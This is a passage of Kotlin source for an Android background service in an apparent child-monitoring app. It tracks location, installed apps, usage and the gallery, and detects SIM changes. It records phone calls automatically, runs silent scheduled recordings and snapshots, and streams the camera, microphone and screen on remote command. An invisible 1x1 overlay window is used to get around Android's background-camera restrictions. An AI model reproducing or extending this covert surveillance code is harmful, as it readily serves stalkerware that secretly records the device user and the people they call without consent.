package com.example.authapp.service

import android.Manifest
import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import android.app.usage.UsageStatsManager
import android.graphics.PixelFormat
import android.view.WindowManager
import com.example.authapp.R
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.config.RemoteConfigManager
import com.example.authapp.data.AppPreferences
import com.example.authapp.data.AppUsageInfo
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.data.FirebaseControlRepository
import com.example.authapp.data.UserLocation
import com.example.authapp.recorder.CallRecorder
import com.example.authapp.recorder.StreamAudioRecorder
import com.example.authapp.webrtc.WebRtcManager
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.ValueEventListener
import java.util.Calendar
import kotlinx.coroutines.launch

class ChildForegroundService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null
    private var locationRequestListener: ValueEventListener? = null
    private var webRtcManager: WebRtcManager? = null
    private var streamRequestListener: ValueEventListener? = null
    private var streamRecordingListener: ValueEventListener? = null
    private var streamAudioRecorder: StreamAudioRecorder? = null
    private var callRecorder: CallRecorder? = null
    private var sdpAnswerListener: ValueEventListener? = null
    private var parentCandidateListener: ChildEventListener? = null
    private var cameraFacingListener: ValueEventListener? = null
    private var snapshotRequestListener: ValueEventListener? = null
    private var recordingScheduleListener: ValueEventListener? = null
    private var parentControlsListener: ValueEventListener? = null
    private var remoteCommandsListener: ValueEventListener? = null
    private var geofencesListener: ValueEventListener? = null
    private var activeGeofences = listOf<com.example.authapp.data.GeofenceZone>()
    private var scheduledStopRunnable: Runnable? = null
    private var currentSessionId: String? = null
    private var isStreaming = false
    @Volatile
    private var isStartingStream = false
    private var lastStreamStartTime = 0L
    private var lastStartedSessionId = ""
    @Volatile
    private var isCapturingSnapshot = false
    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private var candidateBatcher: com.example.authapp.webrtc.CandidateBatcher? = null
    private var ambientAudioStreamer: com.example.authapp.audio.AmbientAudioStreamer? = null
    private var overlayView: android.view.View? = null
    private var studyModeOverlayView: android.view.View? = null
    private var adaptiveHeartbeatManager: com.example.authapp.utils.AdaptiveHeartbeatManager? = null
    private var currentServiceState: String = "IDLE_PROTECTED"
    private var networkMonitor: com.example.authapp.utils.NetworkHistoryMonitor? = null
    private var batteryReceiver: com.example.authapp.receiver.BatteryStatusReceiver? = null
    private var networkCallback: android.net.ConnectivityManager.NetworkCallback? = null
    private var permissionShieldHandler: android.os.Handler? = null
    private var permissionShieldRunnable: Runnable? = null
    private var lastHistoryLocation: Location? = null
    private var lastHistoryTimestamp: Long = 0L
    private var mediaContentObserver: android.database.ContentObserver? = null
    private var subscriptionsChangedListener: Any? = null
    private var dynamicSimReceiver: BroadcastReceiver? = null

    private val serviceJob = kotlinx.coroutines.SupervisorJob()
    private val serviceScope = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO + serviceJob)

    companion object {
        const val CHANNEL_ID = "ChildStreamChannel"
        const val NOTIFICATION_ID = 1001
        const val ACTION_START_MONITORING = "ACTION_START_MONITORING"
        const val ACTION_START = "ACTION_START_STREAM"
        const val ACTION_START_SCREEN_STREAM = "ACTION_START_SCREEN_STREAM"
        const val ACTION_STOP = "ACTION_STOP_SERVICE"
        const val ACTION_STOP_STREAM = "ACTION_STOP_STREAM_ONLY"
        const val ACTION_START_CALL_RECORDING = "ACTION_START_CALL_RECORDING"
        const val ACTION_STOP_CALL_RECORDING = "ACTION_STOP_CALL_RECORDING"
        const val ACTION_SCHEDULED_RECORDING = "ACTION_SCHEDULED_RECORDING"
        const val ACTION_TAKE_SNAPSHOT = "ACTION_TAKE_SNAPSHOT"
        const val ACTION_EXECUTE_COMMAND = "ACTION_EXECUTE_COMMAND"
        const val EXTRA_STREAM_TYPE = "EXTRA_STREAM_TYPE"
        const val EXTRA_SESSION_ID = "EXTRA_SESSION_ID"
        const val EXTRA_PHONE_NUMBER = "EXTRA_PHONE_NUMBER"
        const val EXTRA_CAMERA_FACING = "EXTRA_CAMERA_FACING"
        const val EXTRA_COMMAND = "EXTRA_COMMAND"
        const val EXTRA_COMMAND_VALUE = "EXTRA_COMMAND_VALUE"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        // Battery Optimization: WakeLock is acquired only during active streaming/recording, not during idle monitoring
        startLocationMonitoring()
        startHeartbeatTimer()

        networkMonitor = com.example.authapp.utils.NetworkHistoryMonitor(this).apply { startMonitoring() }
        startSimMonitoring()
        com.example.authapp.sync.KeepAliveWorker.schedule(applicationContext)

        // OFFLINE-FIRST: Network restore hone par pending recordings upload karo
        startNetworkRestoreSync()

        try {
            batteryReceiver = com.example.authapp.receiver.BatteryStatusReceiver()
            val filter = android.content.IntentFilter().apply {
                addAction(Intent.ACTION_BATTERY_LOW)
                addAction(Intent.ACTION_POWER_CONNECTED)
                addAction(Intent.ACTION_POWER_DISCONNECTED)
            }
            // ✅ FIX: RECEIVER_NOT_EXPORTED required for Android 14+ (targetSdk 34+)
            ContextCompat.registerReceiver(this, batteryReceiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED)
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] BatteryReceiver register error: ${e.localizedMessage}")
        }
    }

    /**
     * Network wapas aane par pending uploads ka sync trigger karo.
     * ConnectivityManager callback se real-time network change detect hota hai.
     */
    private fun startNetworkRestoreSync() {
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return
            val callback = object : android.net.ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: android.net.Network) {
                    super.onAvailable(network)
                    // Internet restore hua — pending queue check karo
                    if (!com.example.authapp.sync.PendingUploadQueue.isEmpty(applicationContext)) {
                        FirebaseCrashlytics.getInstance().log(
                            "[ChildService] Network restored — triggering pending upload sync (${com.example.authapp.sync.PendingUploadQueue.size(applicationContext)} items)"
                        )
                        com.example.authapp.sync.SyncScheduler.scheduleWorker(applicationContext)
                    }
                }
            }
            this.networkCallback = callback
            connectivityManager.registerDefaultNetworkCallback(callback)
            FirebaseCrashlytics.getInstance().log("[ChildService] Network restore sync listener registered")
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] Network callback register error: ${e.localizedMessage}")
        }
    }

    private fun startSimMonitoring() {
        com.example.authapp.security.SimChangeDetector.checkSimChange(this)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? android.telephony.SubscriptionManager
                val listener = object : android.telephony.SubscriptionManager.OnSubscriptionsChangedListener() {
                    override fun onSubscriptionsChanged() {
                        super.onSubscriptionsChanged()
                        com.example.authapp.security.SimChangeDetector.checkSimChange(applicationContext)
                    }
                }
                subscriptionsChangedListener = listener
                sm?.addOnSubscriptionsChangedListener(listener)
                FirebaseCrashlytics.getInstance().log("[ChildService] OnSubscriptionsChangedListener registered successfully")
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] SubscriptionsChangedListener register error: ${e.localizedMessage}")
            }
        }
        try {
            dynamicSimReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    com.example.authapp.security.SimChangeDetector.checkSimChange(applicationContext)
                }
            }
            val filter = IntentFilter().apply {
                addAction("android.intent.action.SIM_STATE_CHANGED")
                addAction("android.telephony.action.DEFAULT_SUBSCRIPTION_CHANGED")
                addAction("android.telephony.action.SIM_CARD_STATE_CHANGED")
                addAction("android.telephony.action.SIM_APPLICATION_STATE_CHANGED")
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                ContextCompat.registerReceiver(this, dynamicSimReceiver!!, filter, ContextCompat.RECEIVER_EXPORTED)
            } else {
                registerReceiver(dynamicSimReceiver, filter)
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] DynamicSimReceiver register error: ${e.localizedMessage}")
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildService:WakeLock")?.apply {
                // 2 ghante max — streaming ke liye kafi hai, 12h extreme battery drain karta tha
                acquire(2 * 60 * 60 * 1000L)
            }
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            wifiLock = wm?.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "ChildService:WifiLock")?.apply {
                acquire()
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] WakeLock acquire error: ${e.localizedMessage}")
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
            if (wifiLock?.isHeld == true) wifiLock?.release()
        } catch (_: Exception) {}
        wakeLock = null
        wifiLock = null
    }

    private fun startHeartbeatTimer() {
        adaptiveHeartbeatManager = com.example.authapp.utils.AdaptiveHeartbeatManager(this) {
            if (isStreaming) currentServiceState else "IDLE_PROTECTED"
        }.apply {
            start()
        }

    }

    private fun hasOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.provider.Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    private fun ensureOverlayWindow() {
        mainHandler.post {
            if (overlayView != null) return@post
            if (!hasOverlayPermission()) {
                FirebaseCrashlytics.getInstance().log("[ChildService] ensureOverlayWindow: SYSTEM_ALERT_WINDOW permission missing, cannot add overlay")
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "OVERLAY_WINDOW",
                    "PERMISSION_DENIED",
                    "SYSTEM_ALERT_WINDOW not granted; foreground service alone may fail to capture camera on Android 11+"
                )
                return@post
            }
            try {
                val wm = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager ?: return@post
                val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    android.view.WindowManager.LayoutParams.TYPE_PHONE
                }
                val params = android.view.WindowManager.LayoutParams(
                    1, 1,
                    layoutType,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    android.graphics.PixelFormat.TRANSPARENT
                ).apply {
                    gravity = android.view.Gravity.TOP or android.view.Gravity.START
                    x = 0
                    y = 0
                }
                val view = android.view.View(this@ChildForegroundService).apply {
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                }
                wm.addView(view, params)
                overlayView = view
                FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 transparent overlay window attached for camera compliance")
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "OVERLAY_WINDOW",
                    "SUCCESS",
                    "1x1 overlay window attached successfully"
                )
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().recordException(e)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "OVERLAY_WINDOW",
                    "FAILED",
                    "Failed to attach overlay window: ${e.localizedMessage}",
                    e.message
                )
            }
        }
    }

    private fun removeOverlayWindow() {
        mainHandler.post {
            overlayView?.let { view ->
                try {
                    val wm = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
                    wm?.removeView(view)
                    FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 overlay window removed")
                } catch (_: Exception) {}
                overlayView = null
            }
        }
    }

    private fun updateStudyModeOverlay(isActive: Boolean, message: String) {
        mainHandler.post {
            if (isActive) {
                if (studyModeOverlayView == null && hasOverlayPermission()) {
                    try {
                        val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return@post
                        val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        } else {
                            @Suppress("DEPRECATION")
                            WindowManager.LayoutParams.TYPE_PHONE
                        }
                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            layoutType,
                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                            PixelFormat.TRANSLUCENT
                        )
                        val layout = android.widget.LinearLayout(this).apply {
                            orientation = android.widget.LinearLayout.VERTICAL
                            gravity = android.view.Gravity.CENTER
                            setBackgroundColor(android.graphics.Color.parseColor("#E6000000"))
                            setPadding(48, 48, 48, 48)

                            val icon = android.widget.TextView(this@ChildForegroundService).apply {
                                text = "🔒"
                                textSize = 48f
                                gravity = android.view.Gravity.CENTER
                            }
                            val title = android.widget.TextView(this@ChildForegroundService).apply {
                                text = "Study Mode Active"
                                textSize = 24f
                                setTextColor(android.graphics.Color.WHITE)
                                setTypeface(null, android.graphics.Typeface.BOLD)
                                gravity = android.view.Gravity.CENTER
                                setPadding(0, 24, 0, 12)
                            }
                            val subtitle = android.widget.TextView(this@ChildForegroundService).apply {
                                text = message.ifEmpty { "Focus on your studies! This device is locked by your parent." }
                                textSize = 16f
                                setTextColor(android.graphics.Color.LTGRAY)
                                gravity = android.view.Gravity.CENTER
                            }
                            addView(icon)
                            addView(title)
                            addView(subtitle)
                        }
                        wm.addView(layout, params)
                        studyModeOverlayView = layout
                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay displayed")
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay Error: ${e.localizedMessage}")
                    }
                }
            } else {
                studyModeOverlayView?.let { view ->
                    try {
                        val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                        wm?.removeView(view)
                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay removed")
                    } catch (_: Exception) {}
                    studyModeOverlayView = null
                }
            }
        }
    }

    private fun syncAppUsageStats(uid: String) {
        if (uid.isEmpty()) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return
                val cal = Calendar.getInstance().apply {
                    set(Calendar.HOUR_OF_DAY, 0)
                    set(Calendar.MINUTE, 0)
                    set(Calendar.SECOND, 0)
                }
                val startTime = cal.timeInMillis
                val endTime = System.currentTimeMillis()
                val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
                val pm = packageManager
                val usageList = mutableListOf<AppUsageInfo>()
                for (stat in stats) {
                    val totalMins = stat.totalTimeInForeground / (1000 * 60)
                    if (totalMins > 0) {
                        val appName = try {
                            val appInfo = pm.getApplicationInfo(stat.packageName, 0)
                            pm.getApplicationLabel(appInfo).toString()
                        } catch (_: Exception) {
                            stat.packageName.substringAfterLast(".")
                        }
                        usageList.add(
                            AppUsageInfo(
                                packageName = stat.packageName,
                                appName = appName,
                                totalTimeInForegroundMinutes = totalMins,
                                lastTimeUsed = stat.lastTimeUsed
                            )
                        )
                    }
                }
                if (usageList.isNotEmpty()) {
                    FirebaseRepository.syncAppUsage(uid, usageList)
                }
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] App Usage sync notice: ${e.localizedMessage}")
            }
        }
    }

    private fun syncInstalledApps(uid: String) {
        if (uid.isEmpty()) return
        try {
            val pm = packageManager
            val installedApps = pm.getInstalledApplications(0)
            val userApps = installedApps.filter {
                (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 && it.packageName != packageName
            }
            val appList = mutableListOf<Map<String, Any>>()
            for (app in userApps) {
                val appName = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { app.packageName.substringAfterLast(".") }
                appList.add(
                    mapOf(
                        "packageName" to app.packageName,
                        "appName" to appName,
                        "lastUpdated" to System.currentTimeMillis()
                    )
                )
            }
            if (appList.isNotEmpty()) {
                com.google.firebase.database.FirebaseDatabase.getInstance().reference
                    .child("installed_apps").child(uid).setValue(appList)
            }
            FirebaseCrashlytics.getInstance().log("[ChildService] Synced ${userApps.size} installed apps to installed_apps node")
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] syncInstalledApps notice: ${e.localizedMessage}")
        }
    }

    private fun registerMediaObserver(uid: String) {
        if (mediaContentObserver != null || uid.isEmpty()) return
        try {
            mediaContentObserver = object : android.database.ContentObserver(mainHandler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    com.example.authapp.utils.MediaGalleryUtils.scanAndSyncMediaGallery(applicationContext, uid)
                    FirebaseCrashlytics.getInstance().log("[ChildService] MediaStore change detected — auto-synced gallery")
                }
            }
            contentResolver.registerContentObserver(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                mediaContentObserver!!
            )
            FirebaseCrashlytics.getInstance().log("[ChildService] MediaStore ContentObserver registered")
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] MediaObserver register error: ${e.localizedMessage}")
        }
    }

    private var telephonyCallback: Any? = null
    private var activeCallState = TelephonyManager.CALL_STATE_IDLE

    private fun registerTelephonyCallStateListener(uid: String) {
        if (telephonyCallback != null || uid.isEmpty()) return
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val callback = object : android.telephony.TelephonyCallback(), android.telephony.TelephonyCallback.CallStateListener {
                    override fun onCallStateChanged(state: Int) {
                        handlePhoneCallStateChanged(state, uid)
                    }
                }
                tm.registerTelephonyCallback(mainExecutor, callback)
                telephonyCallback = callback
            } else {
                @Suppress("DEPRECATION")
                val listener = object : android.telephony.PhoneStateListener() {
                    @Deprecated("Deprecated in Java")
                    override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                        handlePhoneCallStateChanged(state, uid)
                    }
                }
                @Suppress("DEPRECATION")
                tm.listen(listener, android.telephony.PhoneStateListener.LISTEN_CALL_STATE)
                telephonyCallback = listener
            }
            FirebaseCrashlytics.getInstance().log("[ChildService] Telephony CallState listener registered for auto-call recording")
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] Telephony listener notice: ${e.localizedMessage}")
        }
    }

    private fun handlePhoneCallStateChanged(state: Int, uid: String) {
        if (state == activeCallState) return
        activeCallState = state
        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                FirebaseCrashlytics.getInstance().log("[ChildService] Phone call connected (OFFHOOK) -> starting automatic call recording")
                val startIntent = Intent(applicationContext, ChildForegroundService::class.java).apply {
                    action = ACTION_START_CALL_RECORDING
                    putExtra(EXTRA_PHONE_NUMBER, "active_call")
                }
                try { ContextCompat.startForegroundService(applicationContext, startIntent) } catch (_: Exception) {}
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                FirebaseCrashlytics.getInstance().log("[ChildService] Phone call ended (IDLE) -> stopping automatic call recording")
                val stopIntent = Intent(applicationContext, ChildForegroundService::class.java).apply {
                    action = ACTION_STOP_CALL_RECORDING
                }
                try { ContextCompat.startForegroundService(applicationContext, stopIntent) } catch (_: Exception) {}
            }
        }
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasMicrophonePermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun getIdleServiceType(): Int {
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        }
        return type
    }

    private fun getSnapshotServiceType(): Int {
        var type = getIdleServiceType()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            if (hasCameraPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (hasCameraPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
        }
        return type
    }

    private fun getStreamingServiceType(streamType: String): Int {
        var type = 0
        val isScreen = streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)
        val isVideo = streamType.equals("video", ignoreCase = true) || streamType.equals("camera_video", ignoreCase = true)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (hasMicrophonePermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (hasCameraPermission() && isVideo) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            if (isScreen) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (hasMicrophonePermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (hasCameraPermission() && isVideo) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            if (isScreen && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (isScreen) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
        }
        return type
    }

    private fun updateForegroundNotification(title: String, serviceType: Int) {
        try {
            ServiceCompat.startForeground(
                this,
                NOTIFICATION_ID,
                buildNotification(title),
                serviceType
            )
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] startForeground ($title) notice: ${e.localizedMessage}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_SCREEN_STREAM -> {
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: currentSessionId ?: ""
                val mediaProjectionData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra("MEDIA_PROJECTION_DATA", Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>("MEDIA_PROJECTION_DATA")
                }
                val serviceType = getStreamingServiceType("screen")
                currentServiceState = "STREAMING_SCREEN"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                updateForegroundNotification("Live Screen Sharing Active", serviceType)
                startWebRtcStream(sessionId, "screen", mediaProjectionData)
            }
            ACTION_START -> {
                val streamType = intent.getStringExtra(EXTRA_STREAM_TYPE) ?: "audio"
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
                val durationMinutes = intent.getIntExtra("duration_minutes", 0)

                // Deduplicate redundant start requests if session is already active or in process of starting
                if ((isStreaming || isStartingStream) && currentSessionId == sessionId) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId already active/starting; ignoring duplicate start request.")
                    return START_STICKY
                }
                if (System.currentTimeMillis() - lastStreamStartTime < 4000L && lastStartedSessionId == sessionId) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId triggered within 4s window; ignoring duplicate.")
                    return START_STICKY
                }

                // Enforce scheduled auto-stop if duration was provided or default 15 min safety cap
                scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
                val maxMinutes = if (durationMinutes > 0) durationMinutes else 15
                scheduledStopRunnable = Runnable {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream auto-stopping after $maxMinutes min safety timeout")
                    stopStream()
                }
                scheduledStopRunnable?.let { mainHandler.postDelayed(it, maxMinutes * 60 * 1000L) }

                if (streamType.equals("video", ignoreCase = true)) {
                    ensureOverlayWindow()
                }
                val serviceType = getStreamingServiceType(streamType)
                currentServiceState = when {
                    streamType.equals("video", ignoreCase = true) -> "STREAMING_VIDEO"
                    streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true) -> "STREAMING_SCREEN"
                    else -> "STREAMING_AUDIO"
                }
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "LIVE_STREAM",
                    "STARTED",
                    "Stream command received ($streamType), session: $sessionId, duration: ${if (durationMinutes > 0) "$durationMinutes min" else "unlimited"}"
                )
                updateForegroundNotification("Active Remote Stream ($streamType)", serviceType)

                if (streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)) {
                    val promptIntent = Intent(this, com.example.authapp.ui.activity.ScreenCapturePromptActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra(EXTRA_SESSION_ID, sessionId)
                    }
                    startActivity(promptIntent)
                } else {
                    startWebRtcStream(sessionId, streamType)
                }
            }
            ACTION_START_MONITORING -> {
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                updateForegroundNotification("Background Protection Active", getIdleServiceType())
                startMonitoringStreamRequests()
            }
            ACTION_SCHEDULED_RECORDING -> {
                val durationMinutes = intent.getIntExtra("duration_minutes", 5).coerceIn(1, 120)
                val scheduleId = intent.getStringExtra("schedule_id") ?: ""
                val captureType = intent.getStringExtra("capture_type") ?: "audio"
                val isVideo = captureType.equals("video", ignoreCase = true)

                currentServiceState = "RECORDING_SCHEDULED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "SCHEDULED_RECORDING",
                    "STARTED",
                    "Scheduled silent ${if (isVideo) "video" else "audio"} recording started: schedule=$scheduleId, duration=$durationMinutes min"
                )
                startMonitoringStreamRequests()
                val serviceType = if (isVideo) getStreamingServiceType("video") else getStreamingServiceType("audio")
                updateForegroundNotification("Silent Scheduled Recording (${if (isVideo) "Video" else "Audio"}, $durationMinutes min)", serviceType)
                acquireWakeLock()
                if (callRecorder == null) {
                    callRecorder = CallRecorder(applicationContext)
                }
                callRecorder?.startCallRecording("scheduled_${if (isVideo) "vid" else "aud"}_$scheduleId")

                if (isVideo) {
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    if (uid.isNotEmpty()) {
                        ensureOverlayWindow()
                        try {
                            com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                                isFront = false,
                                onCaptured = { photoFile ->
                                    removeOverlayWindow()
                                    com.example.authapp.sync.SyncScheduler.enqueueUpload(
                                        context = applicationContext,
                                        file = photoFile,
                                        childId = uid,
                                        streamType = "snapshot",
                                        durationSeconds = 0L
                                    )
                                },
                                onError = { removeOverlayWindow() }
                            )
                        } catch (_: Exception) {
                            removeOverlayWindow()
                        }
                    }
                }

                adaptiveHeartbeatManager?.triggerImmediateHeartbeat()
                // Auto-stop after durationMinutes
                scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
                scheduledStopRunnable = Runnable {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording auto-stopping after $durationMinutes min")
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    val durationSec = callRecorder?.recordingStartTimeMillis?.let {
                        if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                    } ?: 0L
                    val recordedFile = callRecorder?.stopCallRecording()
                    callRecorder = null
                    if (!isStreaming) releaseWakeLock()
                    currentServiceState = "IDLE_PROTECTED"
                    AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                    adaptiveHeartbeatManager?.triggerImmediateHeartbeat()
                    updateForegroundNotification("Background Protection Active", getIdleServiceType())
                    if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
